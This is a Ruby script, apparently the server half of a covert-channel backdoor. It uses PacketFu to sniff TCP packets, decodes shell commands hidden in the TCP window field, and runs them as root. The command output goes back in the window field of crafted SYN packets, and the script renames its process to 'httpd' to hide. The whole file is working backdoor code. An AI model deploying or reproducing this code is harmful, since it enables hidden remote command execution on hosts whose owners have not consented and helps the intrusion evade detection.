#!/usr/bin/env ruby
require 'rubygems'
require 'optparse'
require 'packetfu'


# -----------------------------------------------------------------------------------------
# print_usage()
#
# Prints the application usage information.
# 
# -----------------------------------------------------------------------------------------

def print_usage()
    puts "ruby server.rb -p <listening port> -i <listening interface, default \"em1\">
               -f <optional filter override (if using custom client, this may be useful)>"
    exit()
end
# -----------------------------------------------------------------------------------------
#	listen()
#    
# Listens for packets on the specified interface. Our dispatcher logic is here. Listen for
# specific client commands (get). Future additions - add funcitonality to grab a file from
# the server? Configure server settings? Restart script?
#
# -----------------------------------------------------------------------------------------
def listen()

	cap = PacketFu::Capture.new(:iface => @options[:iface], :start => true, :filter => @options[:filter], :promisc => true)
	command = nil
	cap.stream.each do | pkt |
	
		if PacketFu::TCPPacket.can_parse?(pkt) then
			packet = PacketFu::Packet.parse(pkt)

				# if a FIN comes in then we have our complete command
				if packet.tcp_flags.fin == 1 then

                    exec_command(command, packet)
				
				else #not a fin packet recieved
					if command.nil? then
						command = decode(packet.tcp_win)
					else
						command << decode(packet.tcp_win)
					end
				end #FIN
		end #can parse
	end #capture
		
end

# -----------------------------------------------------------------------------------------
#	decode(int)
#    
# Decodes our integer and returns the ascii character
#
# -----------------------------------------------------------------------------------------
def decode(int)
    return ((int * 5)/20).chr

end
# -----------------------------------------------------------------------------------------
#	exec_command(command)
#    
# Executes a command on the server, grabes the output and sends it back to the client.
#
# -----------------------------------------------------------------------------------------
def exec_command(command, packet)

    begin
	    result = `#{command}`
	rescue Exception => e
	    result =  e.to_s
	end    
	  
	#send result back to client
	send_data(result, packet)
	listen()
	
end

# -----------------------------------------------------------------------------------------
#	send_data(string)
#    
# Sends data back to the client followed by a FIN packet to indicate completion.
#
# -----------------------------------------------------------------------------------------
def send_data(string, packet)

	pkt = PacketFu::TCPPacket.new

	#send the data
	string.each_byte do |char|
		pkt.ip_daddr = packet.ip_saddr #the servers ip
		pkt.ip_saddr = packet.ip_daddr #the senders ip
		pkt.tcp_flags = PacketFu::TcpFlags.new(:syn => 1)	
		pkt.tcp_win = char
		pkt.recalc
		pkt.to_w(@options[:iface])
	end
	
	#send a FIN to indicate completion
	pkt_f = PacketFu::TCPPacket.new
	pkt_f.ip_daddr = packet.ip_saddr #the servers ip
	pkt_f.ip_saddr = packet.ip_daddr #the senders ip
	pkt_f.tcp_flags = PacketFu::TcpFlags.new(:fin => 1)
	pkt_f.recalc
	pkt_f.to_w(@options[:iface])


end
# -----------------------------------------------------------------------------------------
#
#    Application entry point. Get options, make root, and waits for input
#
# -----------------------------------------------------------------------------------------
@options = {}

# Set defaults for options
@options[:iface] = "em1" 
@options[:filter] = ""
@options[:port] = ''
optparser = OptionParser.new do | opts |
    
    opts.on('-h', '--help','Display usage') do
        print_usage()    
        end
        opts.on('-p' '--port LISTEN PORT','The port to listen on.') do |p|
            @options[:port] = p;    
        end
        opts.on('-i' '--iface INTERFACE','The interface to listen on.') do |i|
            @options[:iface] = i;    
        end
        opts.on('-f' '--filter FiLTER','The filter to listen on. For optional override.') do |f|
            @options[:filter] = f;    
        end
end.parse! #optparse

raise "Must be run as root" unless Process.uid == 0
$0 = "httpd"

#usually filter isnt supplied but that's okay. We'll build it ourself.
if @options[:filter] == '' then
	
	@options[:filter] ="tcp dst port " + @options[:port]

end
puts @options[:filter]
listen()


